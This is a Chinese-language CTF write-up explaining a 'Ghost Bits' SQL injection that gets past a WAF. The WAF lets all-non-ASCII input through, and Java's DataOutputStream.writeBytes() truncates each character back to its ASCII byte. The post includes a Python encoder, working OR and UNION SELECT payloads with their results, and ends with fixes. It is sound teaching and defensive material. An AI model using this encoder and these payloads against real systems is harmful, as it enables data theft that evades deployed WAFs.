---
abbrlink: ''
categories:
- - 技巧手法
date: '2026-04-29T10:29:00.377744+08:00'
tags: []
title: Ghost Bit SQL 注入绕 WAF
updated: '2026-04-29T10:29:01.066+08:00'
---
## 简介

群友给的一道题，是 sql 注入的题，主要是学习一下最近出的新手法——Java 比特位溢出绕 WAF

不太懂的可以看一下：[【WAF集体沦陷】Java "幽灵比特位"（Ghost Bits）引发的新型 WAF 绕过与注入攻击]()

一个内部服务搜索系统，配有WAF防护。搜索框支持模糊查询，输入关键词即可搜索服务列表。WAF拦截了所有已知的SQL注入攻击向量，但似乎遗漏了什么……

看起来是 like 查询

![image](https://img2.eval.moe/image-20260428173508-lhp30b4.png)

正常请求：

```
GET /search?q=a HTTP/1.1

```

返回：

```
{
     "items": [
          {
               "name": "Admin Panel",
               "description": "System administration interface",
               "id": 1,
               "category": "System"
          },
          {
               "name": "Flag Manager",
               "description": "Feature flag management service",
               "id": 3,
               "category": "DevOps"
          },
          {
               "name": "User Auth Service",
               "description": "Authentication and authorization",
               "id": 4,
               "category": "Security"
          },
          {
               "name": "DataSync Module",
               "description": "Real-time data synchronization",
               "id": 5,
               "category": "Module"
          },
          {
               "name": "API Gateway",
               "description": "Request routing and rate limiting",
               "id": 6,
               "category": "Infrastructure"
          },
          {
               "name": "Cache Layer",
               "description": "Distributed caching service",
               "id": 8,
               "category": "Infrastructure"
          },
          {
               "name": "AAA Framework",
               "description": "Authentication Authorization Accounting",
               "id": 9,
               "category": "Security"
          },
          {
               "name": "Task Scheduler",
               "description": "Cron job management platform",
               "id": 10,
               "category": "DevOps"
          }
     ],
     "status": "success"
}
```

## 解题思路

1. 尝试传统注入，均被 waf 拦截

```
GET /search?q=a' => 403
GET /search?q='OR'1'='1--
GET /search?q='OR%201=1
GET /search?q=a' 
```

查看 WAF 规则， 发现拦截了

* 所有SQL关键字（OR, AND, UNION, SELECT, FROM, WHERE等）
* 所有特殊字符（引号、括号、等号、注释符等）
* URL编码（3层解码后检测）
* 宽字节注入（%bf%27等）
* 双写绕过（OORR, SESELECTLECT等）
* 注释绕过（去除注释后重新检测）

2. 仔细分析 WAF 逻辑，发现一个特殊分支

> 当输入全部由非ASCII字符（Unicode码点 ≥ 0x80）组成时，WAF直接放行，不做任何黑名单检测。

```java
boolean isAllNonAscii = true;
for (char c : input.toCharArray()) {
    if (c < 0x80) {
        isAllNonAscii = false;
        break;
    }
}

if (isAllNonAscii) {
    return true;  // 直接放行！
}
```

同时 WAF 末尾还有一层检测

```java
for (char c : input.toCharArray()) {
    if (!Character.isLetterOrDigit(c) && c != '_') {
        return false;
    }
}
```

这意味着混合ASCII和非ASCII的输入中，非字母数字的ASCII字符会被拦截。但如果输入全是非ASCII字符，则绕过所有检测。

3. 分析源码发现查询参数经过一个 serializeAndDeserialize 序列化管道处理，QuerySerializer 实现了二进制协议的序列化/反序列化，用于查询数据的传输管道。

```java
public class QuerySerializer {

    private static final byte PROTOCOL_VERSION = 0x01;
    private static final byte MSG_TYPE_QUERY = 0x02;

    public static String serializeAndDeserialize(String input) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);

        dos.writeByte(PROTOCOL_VERSION);
        dos.writeByte(MSG_TYPE_QUERY);
        dos.writeInt(input.length());
        dos.writeBytes(input);    // 关键漏洞点！
        dos.flush();

        byte[] data = baos.toByteArray();
        DataInputStream dis = new DataInputStream(new ByteArrayInputStream(data));

        dis.readByte();
        dis.readByte();
        int len = dis.readInt();

        byte[] queryBytes = new byte[len];
        dis.readFully(queryBytes);

        return new String(queryBytes, StandardCharsets.UTF_8);
    }
}
```

java.io.DataOutputStream 是 JDK 标准库的真实方法，它将每个 char 强制转换为 byte，即只保留低8位，高8位被丢弃。

```java
public final void writeBytes(String s) throws IOException {
    int len = s.length();
    for (int i = 0 ; i < len ; i++) {
        out.write((byte)s.charAt(i));  // 强制转byte，截断高字节！
    }
}
```

这种模式在真实项目中广泛存在：

* Oracle Tuxedo/Jolt 客户端使用 dout.writeBytes(inString) 处理网络传输
* RandomAccessFile.writeBytes() 用于文件写入
* Netty 的 ByteBufOutputStream 实现了 DataOutput 接口，同样有此方法
* 自定义二进制协议/序列化中实现 Externalizable 接口时的常见用法

这意味着：


| 输入字符 | Unicode码点 | 二进制 | writeBytes输出 | 截断后 |
| -------- | ----------- | ------ | -------------- | ------ |
| A        | U+0041      | 0x0041 | 0x41           | A      |
| Ā       | U+0100      | 0x0100 | 0x00           | NUL    |
| ā       | U+0101      | 0x0101 | 0x01           | SOH    |
| ł       | U+0142      | 0x0142 | 0x42           | B      |
| Ń       | U+0143      | 0x0143 | 0x43           | C      |
| ŏ       | U+014F      | 0x014F | 0x4F           | O      |
| ŕ       | U+0155      | 0x0155 | 0x55           | U      |

核心原理：将每个ASCII字符的码点加上0x0100，得到对应的Unicode字符。这些字符的码点 ≥ 0x80，WAF直接放行；但经过writeBytes()  处理后，高字节被截断，还原为原始ASCII字符，构成有效的SQL注入语句。

4. 构造 payload

编码函数：将每个字符的码点 +0x0100

```python
def encode(payload):
    result = ""
    for char in payload:
        result += chr(ord(char) + 0x0100)
    return result
```

5. 验证注入

原始payload：' OR '1'='1

编码后发送请求，WAF检测：输入全部为非ASCII字符 → 放行

后端处理：writeBytes() 截断高字节 → 还原为 ' OR '1'='1

SQL执行：

```sql
SELECT id, name, description, category FROM items
WHERE LOWER(name) LIKE '%' OR '1'='1%'
```

返回所有10条记录，注入成功。

```java
GET /search?q={encode(payload)}
```

返回

```java
{
  "items": [
    {
      "name": "Admin Panel",
      "description": "System administration interface",
      "id": 1,
      "category": "System"
    },
    {
      "name": "Test Environment",
      "id": 2,
      "category": "DevOps"
    },
    {
      "name": "Flag Manager",
      "description": "Feature flag management service",
      "id": 3,
      "category": "DevOps"
    },
    {
      "name": "User Auth Service",
      "description": "Authentication and authorization",
      "id": 4,
      "category": "Security"
    },
    {
      "name": "DataSync Module",
      "description": "Real-time data synchronization",
      "id": 5,
      "category": "Module"
    },
    {
      "name": "API Gateway",
      "description": "Request routing and rate limiting",
      "id": 6,
      "category": "Infrastructure"
    },
    {
      "name": "Log Collector",
      "description": "Centralized log aggregation",
      "id": 7,
      "category": "Monitoring"
    },
    {
      "name": "Cache Layer",
      "description": "Distributed caching service",
      "id": 8,
      "category": "Infrastructure"
    },
    {
      "name": "AAA Framework",
      "description": "Authentication Authorization Accounting",
      "id": 9,
      "category": "Security"
    },
    {
      "name": "Task Scheduler",
      "description": "Cron job management platform",
      "id": 10,
      "category": "DevOps"
    }
  ],
  "status": "success"
}
```

6. 获取 flag

原始payload：' UNION SELECT 1,flag,'x','x' FROM flags--

编码后发送请求，WAF放行，后端还原为：

```sql
SELECT id, name, description, category FROM items
WHERE LOWER(name) LIKE '%' UNION SELECT 1, flag, 'x', 'x' FROM flags--%'
```

-- 注释截断了末尾的 %'，SQL有效执行。

返回：

```json
{
  "status": "success",
  "items": [
    {
      "id": 1,
      "name": "flag{y0u_f0und_th3_h1dd3n_byt3s!}",
      "description": "x",
      "category": "x"
    }
  ]
}
```

## 漏洞原理总结

```
用户输入 (全非ASCII Unicode)
    │
    ▼
┌─────────────────────────────┐
│  WAF 检测                    │
│  所有字符 ≥ 0x80             │
│  → isAllNonAscii = true     │
│  → 直接放行，不做黑名单检测   │
└─────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────┐
│  QuerySerializer (二进制协议管道)     │
│  DataOutputStream.writeBytes()      │
│  (byte)s.charAt(i)                  │
│  截断char高字节                      │
│  U+01XX → 0xXX                      │
│  非ASCII → ASCII                     │
└─────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────┐
│  SQL LIKE 拼接               │
│  还原后的ASCII字符构成        │
│  有效的SQL注入语句            │
└─────────────────────────────┘
```

核心问题：DataOutputStream.writeBytes() 是JDK标准库的真实方法，在将 char 转为 byte 时会丢失高字节信息。这种序列化模式在真实项目中广泛使用（二进制协议、网络传输、文件IO等）。攻击者利用这一特性，将SQL关键字编码为高码点Unicode字符绕过WAF，再由 writeBytes() 还原为有效SQL。

修复方案：

1. 使用 writeUTF() 替代 writeBytes()，writeUTF() 会正确处理UTF-8编码
2. 在WAF中先对输入进行与后端相同的字符编码转换处理后再检测
3. 使用参数化查询（PreparedStatement）从根本上防止SQL注入
